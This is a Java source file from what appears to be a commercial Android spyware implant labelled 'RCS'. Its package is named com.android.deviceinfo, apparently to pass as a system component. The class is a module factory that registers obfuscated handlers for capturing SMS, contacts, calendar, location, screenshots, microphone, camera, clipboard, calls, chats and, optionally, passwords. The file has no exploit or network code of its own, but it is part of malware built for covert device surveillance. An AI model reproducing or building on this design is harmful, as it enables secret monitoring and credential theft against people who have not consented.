/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module;

import java.util.Enumeration;
import java.util.Hashtable;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.interfaces.AbstractFactory;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

public class FactoryModule implements AbstractFactory<BaseModule, String> {
	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$
	Hashtable<String, Class> factorymap = new Hashtable<String, Class>();
	Hashtable<Class, String> typemap = new Hashtable<Class, String>();

	public FactoryModule() {
		factorymap.put(M.e("sms"), ModuleMessage.class);
		factorymap.put(M.e("addressbook"), ModuleAddressBook.class);
		factorymap.put(M.e("calendar"), ModuleCalendar.class);
		factorymap.put(M.e("device"), ModuleDevice.class);
		factorymap.put(M.e("position"), ModulePosition.class);
		factorymap.put(M.e("screenshot"), ModuleSnapshot.class);
		factorymap.put(M.e("messages"), ModuleMessage.class);
		factorymap.put(M.e("mic"), ModuleMic.class);
		factorymap.put(M.e("camera"), ModuleCamera.class);
		factorymap.put(M.e("clipboard"), ModuleClipboard.class);
		factorymap.put(M.e("crisis"), ModuleCrisis.class);
		factorymap.put(M.e("application"), ModuleApplication.class);
		factorymap.put(M.e("call"), ModuleCall.class);
		factorymap.put(M.e("chat"), ModuleChat.class);
		if (Cfg.ENABLE_PASSWORD_MODULE) {
			factorymap.put(M.e("password"), ModulePassword.class);
		}

		Enumeration<String> en = factorymap.keys();
		while (en.hasMoreElements()) {
			String type = en.nextElement();
			Class cv = factorymap.get(type);
			typemap.put(cv, type);
		}

	}

	public String getType(Class cl) {
		if(typemap.containsKey(cl)){
			return typemap.get(cl);
		}
		return "unknown type";
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public BaseModule create(String type, String subtype) {
		BaseModule a = new NullModule();
		if (factorymap.containsKey(type))

			try {
				Class cl = factorymap.get(type);
				return (BaseModule) cl.newInstance();
			} catch (IllegalAccessException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (create) Error: " + e);
				}
			} catch (InstantiationException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (create) Error: " + e);
				}
			}

		return a;

	}
}
